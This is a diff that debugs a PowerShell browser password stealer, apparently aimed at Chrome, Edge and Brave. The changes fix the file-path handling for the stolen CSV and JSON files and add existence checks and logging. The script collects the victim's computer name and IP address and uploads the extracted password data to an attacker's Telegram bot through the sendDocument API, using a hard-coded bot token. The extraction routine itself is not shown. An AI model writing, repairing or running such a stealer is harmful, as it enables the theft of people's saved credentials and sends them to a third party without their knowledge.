@@ -1,5 +1,5 @@
 # Multi-Browser Encrypted Password Extraction Script with Telegram Upload
-# Extracts encrypted password data for future decryption from Chrome, Edge, and Brave
+# Fixed file path handling for Telegram upload
 
 param(
     [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
@@ -11,12 +11,14 @@ $systemName = $env:COMPUTERNAME
 $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPv4Address.IPAddressToString
 $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
 
-# Create file names with IP address and system name
-$CSVPath = ".\${ipAddress}_${systemName}_${timestamp}.csv"
-$JSONPath = ".\${ipAddress}_${systemName}_${timestamp}.json"
+# Get the current working directory for proper file paths
+$workingDir = Get-Location
+$CSVPath = Join-Path $workingDir "${ipAddress}_${systemName}_${timestamp}.csv"
+$JSONPath = Join-Path $workingDir "${ipAddress}_${systemName}_${timestamp}.json"
 
 Write-Host "Multi-Browser Encrypted Password Extraction Tool" -ForegroundColor Green
 Write-Host "================================================" -ForegroundColor Green
+Write-Host "Working Directory: $workingDir" -ForegroundColor Yellow
 Write-Host "Files will be saved as:" -ForegroundColor Yellow
 Write-Host "CSV: $CSVPath" -ForegroundColor Yellow
 Write-Host "JSON: $JSONPath" -ForegroundColor Yellow
@@ -48,11 +50,15 @@ function Send-TelegramFile {
     try {
         if (-not (Test-Path $FilePath)) {
             Write-Host "File not found: $FilePath" -ForegroundColor Red
+            Write-Host "Current directory: $(Get-Location)" -ForegroundColor Yellow
+            Write-Host "Available files:" -ForegroundColor Yellow
+            Get-ChildItem -Path . -Filter "*.csv" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  - $($_.Name)" -ForegroundColor Gray }
+            Get-ChildItem -Path . -Filter "*.json" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  - $($_.Name)" -ForegroundColor Gray }
             return $false
         }
         
+        Write-Host "Reading file: $FilePath" -ForegroundColor Yellow
         $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileContent = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
         $boundary = [System.Guid]::NewGuid().ToString()
         $LF = "`r`n"
         
@@ -69,11 +75,13 @@ function Send-TelegramFile {
             "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
             "Content-Type: application/octet-stream",
             "",
-            $fileContent,
+            [System.Text.Encoding]::Default.GetString($fileBytes),
             "--$boundary--"
         ) -join $LF
 
         $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
+        Write-Host "Sending file to Telegram..." -ForegroundColor Yellow
+        
         $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
         
         if ($response.ok) {
@@ -85,6 +93,7 @@ function Send-TelegramFile {
         }
     } catch {
         Write-Host "❌ Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "Error details: $($_.Exception.InnerException.Message)" -ForegroundColor Red
         return $false
     }
 }
@@ -100,6 +109,7 @@ function Send-TelegramMessage {
         $body = @{
             chat_id = $TelegramChatID
             text = $Message
+            parse_mode = "HTML"
         }
         
         $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
@@ -429,24 +439,41 @@ if ($allSummaryData.Count -gt 0) {
         Write-Host "JSON export failed: $($_.Exception.Message)" -ForegroundColor Red
     }
     
-    # Send files to Telegram
-    Write-Host "`nSending files to Telegram..." -ForegroundColor Yellow
+    # Wait a moment to ensure files are fully written
+    Start-Sleep -Seconds 2
     
-    $csvCaption = "📊 Browser Password Extraction - CSV Summary`nSystem: $systemName`nIP: $ipAddress`nEntries: $($allSummaryData.Count)"
-    $jsonCaption = "🔐 Browser Password Extraction - JSON Data`nSystem: $systemName`nIP: $ipAddress`nEntries: $($allSummaryData.Count)"
+    # Verify files exist before sending
+    Write-Host "`nVerifying files exist..." -ForegroundColor Yellow
+    $csvExists = Test-Path $CSVPath
+    $jsonExists = Test-Path $JSONPath
     
-    $csvSent = Send-TelegramFile -FilePath $CSVPath -Caption $csvCaption
-    $jsonSent = Send-TelegramFile -FilePath $JSONPath -Caption $jsonCaption
+    Write-Host "CSV file exists: $csvExists" -ForegroundColor $(if ($csvExists) { "Green" } else { "Red" })
+    Write-Host "JSON file exists: $jsonExists" -ForegroundColor $(if ($jsonExists) { "Green" } else { "Red" })
     
-    if ($csvSent -and $jsonSent) {
-        Write-Host "✅ Both files sent to Telegram successfully!" -ForegroundColor Green
-        # Send success message
-        $successMessage = "✅ Password extraction completed!`nSystem: $systemName`nIP: $ipAddress`nTotal entries: $($allSummaryData.Count)`nFiles sent successfully!"
-        Send-TelegramMessage -Message $successMessage | Out-Null
+    if ($csvExists -and $jsonExists) {
+        # Send files to Telegram
+        Write-Host "`nSending files to Telegram..." -ForegroundColor Yellow
+        
+        $csvCaption = "📊 Browser Password Extraction - CSV Summary`nSystem: $systemName`nIP: $ipAddress`nEntries: $($allSummaryData.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $jsonCaption = "🔐 Browser Password Extraction - JSON Data`nSystem: $systemName`nIP: $ipAddress`nEntries: $($allSummaryData.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        
+        $csvSent = Send-TelegramFile -FilePath $CSVPath -Caption $csvCaption
+        $jsonSent = Send-TelegramFile -FilePath $JSONPath -Caption $jsonCaption
+        
+        if ($csvSent -and $jsonSent) {
+            Write-Host "✅ Both files sent to Telegram successfully!" -ForegroundColor Green
+            # Send success message
+            $successMessage = "✅ Password extraction completed!`nSystem: $systemName`nIP: $ipAddress`nTotal entries: $($allSummaryData.Count)`nFiles sent successfully!"
+            Send-TelegramMessage -Message $successMessage | Out-Null
+        } else {
+            Write-Host "❌ Some files failed to send to Telegram. They are saved locally." -ForegroundColor Yellow
+            # Send error message
+            $errorMessage = "⚠️ Password extraction completed with some errors.`nSystem: $systemName`nIP: $ipAddress`nTotal entries: $($allSummaryData.Count)`nCheck local files for details."
+            Send-TelegramMessage -Message $errorMessage | Out-Null
+        }
     } else {
-        Write-Host "❌ Some files failed to send to Telegram. They are saved locally." -ForegroundColor Yellow
-        # Send error message
-        $errorMessage = "⚠️ Password extraction completed with some errors.`nSystem: $systemName`nIP: $ipAddress`nTotal entries: $($allSummaryData.Count)`nCheck local files for details."
+        Write-Host "❌ Files were not created properly. Cannot send to Telegram." -ForegroundColor Red
+        $errorMessage = "❌ Password extraction failed - files not created.`nSystem: $systemName`nIP: $ipAddress`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
         Send-TelegramMessage -Message $errorMessage | Out-Null
     }
     
@@ -491,5 +518,11 @@ Write-Host "Temporary files cleaned up." -ForegroundColor Green
 
 # Show final file locations
 Write-Host "`nFinal files created:" -ForegroundColor Green
-Write-Host "CSV: $((Get-Item $CSVPath).FullName)" -ForegroundColor Yellow
-Write-Host "JSON: $((Get-Item $JSONPath).FullName)" -ForegroundColor Yellow
+if (Test-Path $CSVPath) {
+    Write-Host "CSV: $((Get-Item $CSVPath).FullName)" -ForegroundColor Yellow
+    Write-Host "CSV Size: $((Get-Item $CSVPath).Length) bytes" -ForegroundColor Gray
+}
+if (Test-Path $JSONPath) {
+    Write-Host "JSON: $((Get-Item $JSONPath).FullName)" -ForegroundColor Yellow
+    Write-Host "JSON Size: $((Get-Item $JSONPath).Length) bytes" -ForegroundColor Gray
+}
